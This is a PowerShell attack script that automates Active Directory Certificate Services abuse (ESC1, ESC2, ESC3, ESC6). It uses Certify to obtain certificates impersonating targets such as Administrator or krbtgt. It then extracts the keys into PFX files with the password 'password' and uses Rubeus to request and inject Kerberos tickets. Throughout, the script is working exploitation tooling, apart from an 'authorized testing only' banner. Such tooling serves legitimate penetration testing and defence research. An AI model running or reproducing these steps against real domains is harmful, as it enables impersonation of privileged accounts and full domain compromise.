# Invoke-ADCSAttack.ps1
# Automated ADCS exploitation framework
# WARNING: For authorized penetration testing only!
#
# Usage Examples:
#   .\Invoke-ADCSAttack.ps1 -AttackType ESC1 -Template VulnerableTemplate -Target Administrator
#   .\Invoke-ADCSAttack.ps1 -AttackType ESC3 -EnrollmentAgentTemplate AgentTemplate -Target "Domain Admins"
#   .\Invoke-ADCSAttack.ps1 -AttackType ESC6 -Template User -Target krbtgt

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [ValidateSet("ESC1", "ESC2", "ESC3", "ESC6")]
    [string]$AttackType,

    [Parameter(Mandatory=$false)]
    [string]$CAServer,

    [Parameter(Mandatory=$false)]
    [string]$CAName,

    [Parameter(Mandatory=$true)]
    [string]$Template,

    [Parameter(Mandatory=$true)]
    [string]$Target,

    [Parameter(Mandatory=$false)]
    [string]$EnrollmentAgentTemplate,

    [Parameter(Mandatory=$false)]
    [string]$CertifyPath = ".\Certify.exe",

    [Parameter(Mandatory=$false)]
    [string]$RubeusPath = ".\Rubeus.exe",

    [Parameter(Mandatory=$false)]
    [string]$OutputDir = ".\output",

    [Parameter(Mandatory=$false)]
    [switch]$AutoAuthenticate
)

#region Configuration

# Create output directory
if (-not (Test-Path $OutputDir)) {
    New-Item -ItemType Directory -Path $OutputDir | Out-Null
}

# Validate tools exist
if (-not (Test-Path $CertifyPath)) {
    Write-Error "Certify.exe not found at: $CertifyPath"
    exit 1
}

if ($AutoAuthenticate -and -not (Test-Path $RubeusPath)) {
    Write-Error "Rubeus.exe not found at: $RubeusPath"
    exit 1
}

# Auto-detect CA if not specified
if (-not $CAServer -or -not $CAName) {
    Write-Host "[*] Auto-detecting Certificate Authority..." -ForegroundColor Cyan

    $ConfigContext = ([ADSI]"LDAP://RootDSE").configurationNamingContext
    $EnrollmentServicesPath = "CN=Enrollment Services,CN=Public Key Services,CN=Services,$ConfigContext"

    try {
        Import-Module ActiveDirectory -ErrorAction Stop
        $CA = Get-ADObject -SearchBase $EnrollmentServicesPath -Filter * -Properties dNSHostName | Select-Object -First 1

        if ($CA) {
            $CAServer = $CA.dNSHostName
            $CAName = $CA.Name
            Write-Host "[+] Found CA: $CAServer\$CAName" -ForegroundColor Green
        } else {
            Write-Error "Could not auto-detect CA. Please specify -CAServer and -CAName"
            exit 1
        }
    } catch {
        Write-Error "Failed to enumerate CA: $_"
        exit 1
    }
}

$CAConfig = "$CAServer\$CAName"

#endregion

#region Attack Functions

function Invoke-ESC1Attack {
    Write-Host "`n[*] Executing ESC1 Attack" -ForegroundColor Yellow
    Write-Host "    Template: $Template" -ForegroundColor Gray
    Write-Host "    Target: $Target" -ForegroundColor Gray
    Write-Host "    CA: $CAConfig" -ForegroundColor Gray

    $OutputCert = Join-Path $OutputDir "$Target-esc1.pem"
    $OutputPFX = Join-Path $OutputDir "$Target-esc1.pfx"

    Write-Host "`n[*] Step 1: Requesting certificate with arbitrary SAN..." -ForegroundColor Cyan

    # Request certificate
    $CertifyArgs = "request /ca:$CAConfig /template:$Template /altname:$Target"
    $CertOutput = & $CertifyPath $CertifyArgs.Split(' ')

    if ($LASTEXITCODE -ne 0) {
        Write-Error "Certificate request failed!"
        return
    }

    # Extract certificate and key
    $CertContent = $CertOutput -join "`n"

    if ($CertContent -match "(?s)-----BEGIN RSA PRIVATE KEY-----(.*?)-----END RSA PRIVATE KEY-----") {
        $PrivateKey = "-----BEGIN RSA PRIVATE KEY-----`n$($Matches[1].Trim())`n-----END RSA PRIVATE KEY-----"
    }

    if ($CertContent -match "(?s)-----BEGIN CERTIFICATE-----(.*?)-----END CERTIFICATE-----") {
        $Certificate = "-----BEGIN CERTIFICATE-----`n$($Matches[1].Trim())`n-----END CERTIFICATE-----"
    }

    if (-not $PrivateKey -or -not $Certificate) {
        Write-Error "Failed to extract certificate or private key from output"
        return
    }

    # Save to file
    "$PrivateKey`n$Certificate" | Out-File -FilePath $OutputCert -Encoding ASCII

    Write-Host "[+] Certificate saved to: $OutputCert" -ForegroundColor Green

    # Convert to PFX
    Write-Host "`n[*] Step 2: Converting to PFX format..." -ForegroundColor Cyan

    $PFXPassword = "password"
    $ConvertCmd = "openssl pkcs12 -in `"$OutputCert`" -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out `"$OutputPFX`" -passout pass:$PFXPassword"

    try {
        Invoke-Expression $ConvertCmd
        Write-Host "[+] PFX created: $OutputPFX" -ForegroundColor Green
        Write-Host "    Password: $PFXPassword" -ForegroundColor Green
    } catch {
        Write-Warning "OpenSSL not available. Manual conversion required."
        Write-Host "[!] Use this command to convert:" -ForegroundColor Yellow
        Write-Host "    $ConvertCmd" -ForegroundColor Gray
    }

    if ($AutoAuthenticate -and (Test-Path $OutputPFX)) {
        Write-Host "`n[*] Step 3: Authenticating with certificate..." -ForegroundColor Cyan
        Invoke-CertificateAuthentication -PFXPath $OutputPFX -PFXPassword $PFXPassword -Username $Target
    }

    Write-Host "`n[+] ESC1 Attack Complete!" -ForegroundColor Green
    Write-Host @"

Next Steps:
1. Authenticate with certificate:
   $RubeusPath asktgt /user:$Target /certificate:$OutputPFX /password:$PFXPassword /ptt

2. Verify access:
   klist
   dir \\$CAServer\C$

"@ -ForegroundColor Cyan
}

function Invoke-ESC2Attack {
    Write-Host "`n[*] Executing ESC2 Attack" -ForegroundColor Yellow
    Write-Host "    Template: $Template (Any Purpose/No EKU)" -ForegroundColor Gray

    # Similar to ESC1 if ENROLLEE_SUPPLIES_SUBJECT is also enabled
    if ($Target) {
        Invoke-ESC1Attack
    } else {
        # Request certificate with default subject
        Write-Host "`n[*] Requesting certificate with Any Purpose EKU..." -ForegroundColor Cyan

        $CertifyArgs = "request /ca:$CAConfig /template:$Template"
        & $CertifyPath $CertifyArgs.Split(' ')

        Write-Host @"

[+] Certificate requested. This certificate can be used for:
   - Client Authentication
   - Server Authentication
   - Code Signing
   - Any other purpose

Manual Steps Required:
1. Extract certificate and convert to PFX
2. Use for desired purpose (authentication, code signing, etc.)

"@ -ForegroundColor Cyan
    }
}

function Invoke-ESC3Attack {
    if (-not $EnrollmentAgentTemplate) {
        Write-Error "ESC3 requires -EnrollmentAgentTemplate parameter"
        return
    }

    Write-Host "`n[*] Executing ESC3 Attack (Enrollment Agent)" -ForegroundColor Yellow
    Write-Host "    Enrollment Agent Template: $EnrollmentAgentTemplate" -ForegroundColor Gray
    Write-Host "    Target Template: $Template" -ForegroundColor Gray
    Write-Host "    Target User: $Target" -ForegroundColor Gray

    $AgentCertPath = Join-Path $OutputDir "agent.pem"
    $AgentPFXPath = Join-Path $OutputDir "agent.pfx"
    $TargetPFXPath = Join-Path $OutputDir "$Target-esc3.pfx"

    Write-Host "`n[*] Step 1: Requesting Enrollment Agent certificate..." -ForegroundColor Cyan

    $AgentArgs = "request /ca:$CAConfig /template:$EnrollmentAgentTemplate"
    $AgentOutput = & $CertifyPath $AgentArgs.Split(' ')

    # Extract and save agent certificate
    $AgentContent = $AgentOutput -join "`n"

    if ($AgentContent -match "(?s)-----BEGIN RSA PRIVATE KEY-----(.*?)-----END RSA PRIVATE KEY-----") {
        $PrivateKey = "-----BEGIN RSA PRIVATE KEY-----`n$($Matches[1].Trim())`n-----END RSA PRIVATE KEY-----"
    }

    if ($AgentContent -match "(?s)-----BEGIN CERTIFICATE-----(.*?)-----END CERTIFICATE-----") {
        $Certificate = "-----BEGIN CERTIFICATE-----`n$($Matches[1].Trim())`n-----END CERTIFICATE-----"
    }

    "$PrivateKey`n$Certificate" | Out-File -FilePath $AgentCertPath -Encoding ASCII

    # Convert agent cert to PFX
    $PFXPassword = "password"
    try {
        $ConvertCmd = "openssl pkcs12 -in `"$AgentCertPath`" -export -out `"$AgentPFXPath`" -passout pass:$PFXPassword"
        Invoke-Expression $ConvertCmd
        Write-Host "[+] Enrollment Agent certificate saved: $AgentPFXPath" -ForegroundColor Green
    } catch {
        Write-Error "Failed to convert agent certificate. OpenSSL required."
        return
    }

    Write-Host "`n[*] Step 2: Requesting certificate on behalf of $Target..." -ForegroundColor Cyan

    $OnBehalfArgs = "request /ca:$CAConfig /template:$Template /onbehalfof:$Target /enrollcert:$AgentPFXPath /enrollcertpw:$PFXPassword"
    $TargetOutput = & $CertifyPath $OnBehalfArgs.Split(' ')

    # Extract target certificate
    $TargetContent = $TargetOutput -join "`n"

    if ($TargetContent -match "(?s)-----BEGIN RSA PRIVATE KEY-----(.*?)-----END RSA PRIVATE KEY-----") {
        $TargetKey = "-----BEGIN RSA PRIVATE KEY-----`n$($Matches[1].Trim())`n-----END RSA PRIVATE KEY-----"
    }

    if ($TargetContent -match "(?s)-----BEGIN CERTIFICATE-----(.*?)-----END CERTIFICATE-----") {
        $TargetCert = "-----BEGIN CERTIFICATE-----`n$($Matches[1].Trim())`n-----END CERTIFICATE-----"
    }

    $TargetPEMPath = Join-Path $OutputDir "$Target-esc3.pem"
    "$TargetKey`n$TargetCert" | Out-File -FilePath $TargetPEMPath -Encoding ASCII

    # Convert to PFX
    try {
        $ConvertCmd = "openssl pkcs12 -in `"$TargetPEMPath`" -export -out `"$TargetPFXPath`" -passout pass:$PFXPassword"
        Invoke-Expression $ConvertCmd
        Write-Host "[+] Target certificate saved: $TargetPFXPath" -ForegroundColor Green
    } catch {
        Write-Error "Failed to convert target certificate"
        return
    }

    if ($AutoAuthenticate -and (Test-Path $TargetPFXPath)) {
        Write-Host "`n[*] Step 3: Authenticating as $Target..." -ForegroundColor Cyan
        Invoke-CertificateAuthentication -PFXPath $TargetPFXPath -PFXPassword $PFXPassword -Username $Target
    }

    Write-Host "`n[+] ESC3 Attack Complete!" -ForegroundColor Green
}

function Invoke-ESC6Attack {
    Write-Host "`n[*] Executing ESC6 Attack (EDITF_ATTRIBUTESUBJECTALTNAME2)" -ForegroundColor Yellow
    Write-Host "    Template: $Template (ANY enrollable template works)" -ForegroundColor Gray
    Write-Host "    Target: $Target" -ForegroundColor Gray

    # ESC6 allows SAN specification in any template
    Invoke-ESC1Attack
}

function Invoke-CertificateAuthentication {
    param(
        [string]$PFXPath,
        [string]$PFXPassword,
        [string]$Username
    )

    Write-Host "[*] Requesting TGT with certificate..." -ForegroundColor Cyan

    $RubeusArgs = "asktgt /user:$Username /certificate:$PFXPath /password:$PFXPassword /ptt"
    & $RubeusPath $RubeusArgs.Split(' ')

    if ($LASTEXITCODE -eq 0) {
        Write-Host "[+] TGT requested and injected!" -ForegroundColor Green
        Write-Host "`n[*] Current tickets:" -ForegroundColor Cyan
        klist
    } else {
        Write-Error "Authentication failed!"
    }
}

#endregion

#region Main Execution

Write-Host @"
╔════════════════════════════════════════════════════════════╗
║           ADCS Attack Automation Framework                 ║
║                  Version 1.0                               ║
║                                                            ║
║  WARNING: For Authorized Security Testing Only!           ║
╚════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Red

Write-Host "`n[!] Attack Type: $AttackType" -ForegroundColor Yellow
Write-Host "[!] Ensure you have explicit authorization before proceeding!" -ForegroundColor Yellow

Start-Sleep -Seconds 2

switch ($AttackType) {
    "ESC1" { Invoke-ESC1Attack }
    "ESC2" { Invoke-ESC2Attack }
    "ESC3" { Invoke-ESC3Attack }
    "ESC6" { Invoke-ESC6Attack }
}

Write-Host "`n╔════════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "║                 ATTACK EXECUTION COMPLETE                  ║" -ForegroundColor Green
Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Green

#endregion
